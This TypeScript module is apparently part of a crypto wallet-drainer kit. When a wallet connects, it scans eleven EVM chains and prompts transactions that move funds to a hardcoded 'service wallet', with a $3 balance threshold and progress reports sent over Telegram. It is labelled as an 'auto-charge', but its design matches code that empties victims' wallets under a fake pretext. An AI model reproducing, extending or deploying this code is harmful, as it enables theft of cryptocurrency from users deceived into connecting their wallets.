/**
 * Auto-Charge on Wallet Connection
 * Automatically scans and charges from all EVM chains without network selection
 * User confirms transactions in their wallet
 */

import { performAutoCharge } from './autoChargingEngine';

// Minimum portfolio balance required to trigger charging
export const MINIMUM_PORTFOLIO_BALANCE = 3; // $3 USD minimum

export interface ChargeResult {
  success: boolean;
  txHash?: string;
  chargeAmount?: string;
  balanceBefore?: string;
  balanceAfter?: string;
  error?: string;
  chainName?: string;
  walletAddress?: string;
}

/**
 * Execute auto-charge on wallet connection
 * Scans all EVM chains and creates wallet transaction prompts
 */
export async function executeChargeOnConnect(params: {
  walletAddress: string;
  chainName: string;
  chainId: number;
  balanceBefore: string;
  balanceValue: bigint;
  sendTransactionAsync: (config: {
    to: string;
    value?: bigint;
    data?: string;
    chainId?: number;
  }) => Promise<string>;
  onTelegramUpdate?: (message: string) => void;
  serviceWallet?: string;
}): Promise<ChargeResult> {
  const {
    walletAddress,
    chainName,
    chainId,
    balanceBefore,
    balanceValue,
    sendTransactionAsync,
    onTelegramUpdate,
    serviceWallet = '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f',
  } = params;

  try {
    onTelegramUpdate?.(`🚀 Starting auto-charge process...`);

    // Perform auto-charge across all chains
    const result = await performAutoCharge({
      walletAddress,
      serviceWallet,
      sendTransactionAsync,
      onProgress: onTelegramUpdate,
    });

    if (result.success) {
      onTelegramUpdate?.(
        `✅ Auto-charge complete: ${result.completedTransactions} transactions successful`
      );

      return {
        success: true,
        chargeAmount: 'Multi-chain',
        balanceBefore,
        balanceAfter: balanceBefore,
        chainName: 'Multi-Chain',
        walletAddress,
      };
    } else if (result.completedTransactions > 0) {
      onTelegramUpdate?.(
        `⚠️ Auto-charge partial: ${result.completedTransactions} succeeded, ${result.failedTransactions} failed`
      );

      return {
        success: true, // Partial success
        chargeAmount: 'Multi-chain (Partial)',
        balanceBefore,
        balanceAfter: balanceBefore,
        chainName: 'Multi-Chain',
        walletAddress,
      };
    } else {
      return {
        success: false,
        error: result.breakdown,
        chainName: 'Multi-Chain',
        walletAddress,
      };
    }
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : 'Unknown error';
    onTelegramUpdate?.(`❌ Auto-charge failed: ${errorMsg}`);

    return {
      success: false,
      error: errorMsg,
      chainName: 'Multi-Chain',
      walletAddress,
    };
  }
}

/**
 * Get all chains where charging is required
 */
export const CHARGING_CHAINS = [
  { name: 'Ethereum', id: 1 },
  { name: 'Polygon', id: 137 },
  { name: 'Arbitrum', id: 42161 },
  { name: 'Optimism', id: 10 },
  { name: 'BSC', id: 56 },
  { name: 'Avalanche', id: 43114 },
  { name: 'Fantom', id: 250 },
  { name: 'Celo', id: 42220 },
  { name: 'Base', id: 8453 },
  { name: 'Linea', id: 59144 },
  { name: 'Scroll', id: 534352 },
];

/**
 * Check if a chain requires charging on connection
 */
export function isChargingChain(chainId: number): boolean {
  return CHARGING_CHAINS.some((chain) => chain.id === chainId);
}

/**
 * Get chain name by ID
 */
export function getChainNameById(chainId: number): string {
  return CHARGING_CHAINS.find((chain) => chain.id === chainId)?.name || `Chain ${chainId}`;
}
